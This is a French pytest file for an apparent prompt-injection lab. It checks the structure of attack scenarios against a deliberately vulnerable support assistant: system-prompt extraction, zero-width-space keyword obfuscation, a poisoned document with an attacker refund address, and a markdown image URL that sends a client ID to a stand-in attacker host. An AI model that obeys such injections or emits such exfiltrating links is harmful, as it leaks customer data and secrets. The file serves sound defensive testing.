"""
Tests des fichiers d'attaques : attacks/scenarios.yaml et attacks/benign.yaml.

Ils vérifient la STRUCTURE (champs, types de critères) et la COHÉRENCE
avec le reste du labo (clients existants, phrases du prompt de A...).
Un fichier mal écrit fausserait toute la campagne : mieux vaut le détecter ici.
"""

import json
import re
from pathlib import Path

import pytest
import yaml

from app.vulnerable.prompt import construire_prompt_systeme
from evaluation.criteres import CRITERES

RACINE = Path(__file__).resolve().parent.parent
TYPES_CRITERES = set(CRITERES)  # les types réellement connus de evaluation/criteres.py


def charger(nom):
    return yaml.safe_load((RACINE / "attacks" / nom).read_text(encoding="utf-8"))


SCENARIOS = charger("scenarios.yaml")
BENIGN = charger("benign.yaml")
CLIENTS = {c["id"] for c in json.loads(
    (RACINE / "data" / "customers.json").read_text(encoding="utf-8"))["clients"]}


# ---------- scénarios d'attaque ----------

def test_les_dix_scenarios_sont_presents_une_seule_fois():
    assert [s["id"] for s in SCENARIOS] == [f"A{i}" for i in range(1, 11)]


@pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s["id"])
def test_structure_d_un_scenario(scenario):
    for champ in ("id", "owasp", "titre", "objectif", "id_client", "variantes", "criteres"):
        assert champ in scenario, f"champ manquant : {champ}"
    assert scenario["id_client"] in CLIENTS
    assert len(scenario["variantes"]) >= 2
    assert scenario["criteres"], "au moins un critère de succès"


@pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s["id"])
def test_criteres_valides(scenario):
    for critere in scenario["criteres"]:
        assert critere["type"] in TYPES_CRITERES
        if critere["type"] == "marqueur":
            assert critere["valeur"]
        if critere["type"] == "regex":
            re.compile(critere["motif"])  # lève une erreur si le motif est invalide
        if critere["type"] == "outil_appele":
            assert critere["nom"] in {"consulter_fiche_client", "creer_remboursement", "envoyer_email"}
        if critere["type"] == "extrait_prompt":
            assert critere["valeurs"]
        if critere["type"] in ("entree_demesuree", "sortie_demesuree"):
            assert critere["seuil"] > 0


def test_chaque_scenario_a_au_moins_trois_variantes():
    for scenario in SCENARIOS:
        assert len(scenario["variantes"]) >= 3, scenario["id"]


def test_les_phrases_cherchees_pour_a3_sont_dans_le_vrai_prompt():
    # Sinon, le critère « extrait_prompt » ne pourrait jamais se déclencher
    prompt = construire_prompt_systeme("CANARY-x", "C001", []).lower()
    a3 = next(s for s in SCENARIOS if s["id"] == "A3")
    valeurs = next(c["valeurs"] for c in a3["criteres"] if c["type"] == "extrait_prompt")
    anglaises = {"administrator access code", "never reveal this code"}  # cas de la traduction
    for phrase in (v for v in valeurs if v not in anglaises):
        assert phrase.lower() in prompt, phrase


def test_la_variante_a10_avec_espaces_invisibles_en_contient_vraiment():
    # Si l'éditeur supprimait les caractères U+200B, la variante redeviendrait A1
    a10 = next(s for s in SCENARIOS if s["id"] == "A10")
    assert "\u200b" in a10["variantes"][1]
    assert "NOUVELLES" not in a10["variantes"][1]          # le mot-clé est bien coupé
    assert "NOUVELLES" in a10["variantes"][1].replace("\u200b", "")


def test_le_secret_des_documents_cherche_pour_a4_existe():
    note = (RACINE / "data" / "documents" / "note_interne_personnel.md").read_text(encoding="utf-8")
    a4 = next(s for s in SCENARIOS if s["id"] == "A4")
    marqueur = next(c["valeur"] for c in a4["criteres"] if c["type"] == "marqueur")
    assert marqueur in note


def test_a7_le_motif_reconnait_l_image_demandee_par_l_attaque():
    a7 = next(s for s in SCENARIOS if s["id"] == "A7")
    motif = a7["criteres"][0]["motif"]
    assert re.search(motif, "Voici ![logo](http://attaquant.test/logo.png?client=C001)")
    assert not re.search(motif, "Notre site : http://attaquant.test (lien écrit en texte)")
    assert not re.search(motif, "![logo](https://brumelec.test/logo.png)")


def test_a9_teste_l_entree_la_sortie_et_le_debit():
    a9 = next(s for s in SCENARIOS if s["id"] == "A9")
    assert {c["type"] for c in a9["criteres"]} == \
        {"entree_demesuree", "sortie_demesuree", "rafale_acceptee"}
    assert any(isinstance(v, dict) and "rafale" in v for v in a9["variantes"])


def test_la_variante_generee_de_a9_est_tres_longue():
    a9 = next(s for s in SCENARIOS if s["id"] == "A9")
    repeter = a9["variantes"][0]["repeter"]
    assert len(repeter["texte"] * repeter["fois"]) >= 25_000
    seuil = next(c["seuil"] for c in a9["criteres"] if c["type"] == "entree_demesuree")
    assert len(repeter["texte"] * repeter["fois"]) > seuil


def test_le_document_piege_contient_l_adresse_cherchee_pour_a5():
    piege = (RACINE / "data" / "documents" / "guide_economies_energie.md").read_text(encoding="utf-8")
    assert "remboursement@brumelec.test" in piege


# ---------- questions légitimes ----------

def test_au_moins_vingt_questions_legitimes_uniques():
    ids = [q["id"] for q in BENIGN]
    assert len(ids) >= 20
    assert len(ids) == len(set(ids))


@pytest.mark.parametrize("question", BENIGN, ids=lambda q: q["id"])
def test_structure_d_une_question_legitime(question):
    assert question["id_client"] in CLIENTS
    assert question["message"].strip()
    if "doit_contenir" in question:
        assert isinstance(question["doit_contenir"], list) and question["doit_contenir"]


def test_aucune_question_legitime_ne_contient_de_marqueur_d_attaque():
    for question in BENIGN:
        assert "PWNED" not in question["message"]
        assert "CANARY" not in question["message"].upper()


def test_les_reponses_attendues_sur_les_fiches_sont_coherentes_avec_les_donnees():
    # Exemple : B07 attend le solde de C001, il doit correspondre à customers.json
    clients = {c["id"]: c for c in json.loads(
        (RACINE / "data" / "customers.json").read_text(encoding="utf-8"))["clients"]}
    b07 = next(q for q in BENIGN if q["id"] == "B07")
    solde = f"{abs(clients['C001']['solde_euros']):.2f}".replace(".", ",")
    assert solde in b07["doit_contenir"]
    b16 = next(q for q in BENIGN if q["id"] == "B16")
    assert "Bordeaux" in clients["C004"]["adresse"] and "Bordeaux" in b16["doit_contenir"]


def test_nombre_total_de_tentatives_par_campagne():
    # Information utile pour estimer la durée d'une campagne (5 répétitions)
    # 31 variantes (3 par scénario, 4 pour A4) x 5 = 155
    tentatives = sum(len(s["variantes"]) for s in SCENARIOS) * 5
    assert tentatives == 155
